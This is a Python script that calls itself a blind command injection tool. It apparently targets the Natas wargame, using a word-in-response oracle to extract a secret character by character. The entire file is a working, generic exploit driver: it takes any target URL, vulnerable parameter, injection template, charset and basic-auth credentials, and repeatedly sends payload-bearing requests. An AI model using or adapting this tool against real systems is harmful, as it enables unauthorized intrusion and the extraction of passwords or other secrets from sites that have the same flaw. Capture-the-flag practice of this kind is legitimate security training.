#!/usr/bin/env python3

import argparse
import requests
import time


def parse_args():
    parser = argparse.ArgumentParser(description="Blind Command Injection Tool")

    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Vulnerable parameter name")
    parser.add_argument(
        "--payload-template",
        required=True,
        help="Injection template using {guess} placeholder"
    )
    parser.add_argument(
        "--charset",
        required=True,
        help="Characters to brute-force"
    )
    parser.add_argument(
        "--max-length",
        type=int,
        required=True,
        help="Maximum length of value to extract"
    )
    parser.add_argument(
        "--auth",
        help="HTTP basic auth in user:pass format"
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Delay between requests"
    )

    return parser.parse_args()


def is_success(response_text: str) -> bool:
    """
    Natas-style oracle:
    - If dictionary output appears → wrong guess
    - If output is empty → correct guess
    """
    return "African" not in response_text


def main():
    args = parse_args()

    auth = None
    if args.auth:
        user, pw = args.auth.split(":", 1)
        auth = (user, pw)

    extracted = ""

    print("[*] Starting blind command injection...\n")

    for _ in range(args.max_length):
        found = False

        for ch in args.charset:
            guess = extracted + ch
            payload = args.payload_template.format(guess=guess)

            response = requests.get(
                args.url,
                params={args.param: payload},
                auth=auth,
                timeout=10
            )

            if is_success(response.text):
                extracted += ch
                print(f"[+] Found: {extracted}")
                found = True
                break

            print(f"[?] Tried: {guess}", end="\r")
            time.sleep(args.delay)

        if not found:
            print("\n[✓] Extraction complete.")
            break

    print(f"\n[✓] Final value: {extracted}")


if __name__ == "__main__":
    main()
